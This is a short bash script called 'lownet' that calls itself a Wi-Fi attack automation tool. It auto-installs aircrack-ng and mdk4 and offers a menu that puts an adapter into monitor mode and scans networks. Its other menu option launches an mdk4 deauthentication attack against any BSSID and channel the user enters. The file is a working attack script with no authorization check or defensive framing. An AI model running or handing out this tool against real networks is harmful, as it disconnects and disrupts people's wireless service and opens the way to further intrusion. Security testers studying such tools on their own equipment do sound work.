#!/bin/bash

# lownet - Lightweight Wi-Fi attack automation tool
# Author: @simplyYan
# License: GNu

REQUIRED=("iwconfig" "airmon-ng" "airodump-ng" "mdk4")

# Detect package manager
detect_package_manager() {
    if command -v apt-get &>/dev/null; then echo "apt-get"
    elif command -v dnf &>/dev/null; then echo "dnf"
    elif command -v pacman &>/dev/null; then echo "pacman"
    elif command -v zypper &>/dev/null; then echo "zypper"
    elif command -v apk &>/dev/null; then echo "apk"
    else echo ""; fi
}

# Install missing dependencies
install_dependencies() {
    local pkg_mgr=$(detect_package_manager)
    if [[ -z "$pkg_mgr" ]]; then
        echo "❌ Unsupported system. Install manually: ${REQUIRED[*]}"
        exit 1
    fi

    for dep in "${REQUIRED[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo "🔧 Installing missing dependency: $dep"
            case "$pkg_mgr" in
                apt-get)
                    sudo apt-get update
                    sudo apt-get install -y aircrack-ng mdk4 ;;
                dnf)
                    sudo dnf install -y aircrack-ng mdk4 ;;
                pacman)
                    sudo pacman -Sy --noconfirm aircrack-ng mdk4 ;;
                zypper)
                    sudo zypper install -y aircrack-ng mdk4 ;;
                apk)
                    sudo apk add aircrack-ng mdk4 ;;
            esac
            break
        fi
    done
}

# Scan Wi-Fi networks
scan_networks() {
    read -p "📶 Enter your Wi-Fi adapter (e.g. wlan0): " adapter
    sudo airmon-ng check kill
    sudo airmon-ng start "$adapter"
    echo "🔍 Scanning for networks... Press Ctrl+C to stop."
    sleep 2
    sudo airodump-ng "${adapter}mon"
}

# Launch Deauth Attack
deauth_attack() {
    read -p "📶 Enter your Wi-Fi adapter (e.g. wlan0): " adapter
    read -p "📡 Enter target BSSID (MAC): " bssid
    read -p "📻 Enter channel (CH): " channel
    sudo airmon-ng check kill
    sudo airmon-ng start "$adapter"
    echo "⚠️  Starting deauth attack on $bssid (channel $channel)..."
    sudo mdk4 "${adapter}mon" d -c "$channel" -B "$bssid"
}

# Main Menu
main_menu() {
    echo -e "\n🌐 lownet - Lightweight Wi-Fi Tool"
    echo "----------------------------------"
    echo "[1] Scan networks"
    echo "[2] Deauth attack"
    echo "[3] Exit"
    echo "----------------------------------"
    read -p "Select an option: " choice

    case "$choice" in
        1) scan_networks ;;
        2) deauth_attack ;;
        3) echo "👋 Goodbye." && exit ;;
        *) echo "❌ Invalid option." && sleep 1 && main_menu ;;
    esac
}

# Run
clear
install_dependencies
main_menu
